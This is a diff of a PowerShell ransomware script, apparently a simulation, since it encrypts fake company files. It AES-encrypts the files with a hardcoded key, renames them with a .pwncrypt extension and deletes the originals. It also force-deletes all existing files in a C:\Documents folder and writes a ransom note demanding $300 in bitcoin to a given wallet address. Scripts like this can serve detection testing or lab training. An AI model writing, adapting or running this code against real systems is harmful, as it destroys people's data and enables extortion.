@@ -1,8 +1,17 @@
-  # Define the Public Desktop path
-$publicDesktop = "C:\Users\Public\Desktop"
+# Define the Public Desktop path and new Documents folder path
+$documentsFolder = "C:\Documents"
+
+# Create the Documents folder if it doesn't exist
+if (-not (Test-Path -Path $documentsFolder)) {
+    New-Item -Path $documentsFolder -ItemType Directory
+}
+
+# Clear the Documents folder if it already contains files
+Get-ChildItem -Path $documentsFolder -File | ForEach-Object {
+    Remove-Item $_.FullName -Force
+}
 
 # Define encryption key and IV (Initialization Vector) for AES
-# Key should be 16, 24, or 32 bytes long for AES
 $key = [System.Text.Encoding]::UTF8.GetBytes("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx") # 32 characters for AES-256
 $iv = [byte[]](1..16) # IV should be 16 bytes for AES
 
@@ -27,18 +36,9 @@ $fakeFiles = @{
     "CompanyFinancials.txt" = "Total Revenue: $10,000,000`nNet Profit: $1,000,000"
 }
 
-# Define the folder path
-$folderPath = "C:\Users\Public\Desktop"
-
-# Get all files in the folder
-Get-ChildItem -Path $folderPath -File | ForEach-Object {
-    # Remove each file
-    Remove-Item $_.FullName -Force
-}
-
-# Create fake text files, encrypt them, then delete the originals
+# Create fake text files in the Documents folder, encrypt them, then delete the originals
 foreach ($file in $fakeFiles.Keys) {
-    $filePath = Join-Path $publicDesktop $file
+    $filePath = Join-Path $documentsFolder $file
 
     # Write the fake company information to the text file
     $fakeContent = $fakeFiles[$file]
@@ -47,7 +47,7 @@ foreach ($file in $fakeFiles.Keys) {
     # Encrypt the file content
     $encryptedContent = Encrypt-Text $fakeContent $key $iv
 
-    # Get the current time
+    # Get the current time (Epoch time)
     $epochTime = [int][double]::Parse((Get-Date -UFormat %s))
 
     # Define the path for the encrypted file with .pwncrypt extension
@@ -60,4 +60,6 @@ foreach ($file in $fakeFiles.Keys) {
     Remove-Item -Path $filePath
 }
 
-"Your files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1" | Out-File -FilePath "$($publicDesktop)\decryption-instructions.txt" -Force 
+# Write the decryption instructions in the Documents folder
+"Your files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1" | Out-File -FilePath "$($documentsFolder)\decryption-instructions.txt" -Force 
+ 
